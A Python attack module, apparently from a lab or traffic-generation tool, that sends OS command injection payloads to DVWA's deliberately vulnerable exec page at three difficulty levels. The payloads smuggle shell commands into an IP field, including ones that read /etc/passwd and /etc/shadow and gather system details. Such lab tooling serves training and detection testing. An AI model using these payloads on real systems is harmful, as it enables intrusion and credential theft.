"""OS Command Injection attack against DVWA."""

import random
from .base import AttackModule, logger

CMD_PAYLOADS_LOW = [
    "127.0.0.1; cat /etc/passwd",
    "127.0.0.1; id",
    "127.0.0.1; whoami",
    "127.0.0.1; uname -a",
    "127.0.0.1 && cat /etc/shadow",
    "127.0.0.1 | ls -la /",
    "127.0.0.1; cat /etc/hosts",
    "127.0.0.1; netstat -an",
]

CMD_PAYLOADS_MEDIUM = [
    "127.0.0.1 | cat /etc/passwd",
    "127.0.0.1 | id",
    "127.0.0.1 | whoami",
    "127.0.0.1 | uname -a",
]

CMD_PAYLOADS_HIGH = [
    "127.0.0.1|cat /etc/passwd",
    "127.0.0.1|id",
    "127.0.0.1|whoami",
]


class CommandInjection(AttackModule):
    NAME = "command_injection"

    def _attack(self, session, payloads, count):
        for payload in random.sample(payloads, min(count, len(payloads))):
            token = session.get_csrf_token("/vulnerabilities/exec/")
            session.post(
                "/vulnerabilities/exec/",
                data={"ip": payload, "Submit": "Submit", "user_token": token},
            )
            logger.debug("[cmd_injection] Payload: %s", payload)

    def run_low(self, session):
        self._attack(session, CMD_PAYLOADS_LOW, random.randint(4, 7))

    def run_medium(self, session):
        self._attack(session, CMD_PAYLOADS_MEDIUM, random.randint(2, 4))

    def run_high(self, session):
        self._attack(session, CMD_PAYLOADS_HIGH, 3)
